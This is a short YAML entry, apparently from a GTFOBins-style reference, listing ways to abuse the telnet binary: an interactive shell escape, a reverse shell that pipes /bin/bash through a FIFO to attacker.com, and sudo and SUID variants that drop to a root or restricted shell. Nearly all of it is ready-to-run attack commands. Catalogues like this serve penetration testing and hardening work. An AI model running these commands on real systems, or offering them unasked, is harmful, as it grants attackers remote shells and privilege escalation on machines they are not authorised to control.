---
functions:
  exec-interactive:
    - description: BSD version only. Needs to be connected first.
      code: |
        RHOST=attacker.com
        RPORT=12345
        telnet $RHOST $RPORT
        ^]
        !/bin/sh
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        RHOST=attacker.com
        RPORT=12345
        TF=$(mktemp)
        rm $TF
        mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/bash 1>$TF
  sudo-enabled:
    - description: BSD version only. Needs to be connected first.
      code: |
        RHOST=attacker.com
        RPORT=12345
        sudo telnet $RHOST $RPORT
        ^]
        !/bin/sh
  suid-limited:
    - description: BSD version only. Needs to be connected first.
      code: |
        RHOST=attacker.com
        RPORT=12345
        ./telnet $RHOST $RPORT
        ^]
        !/bin/sh

---
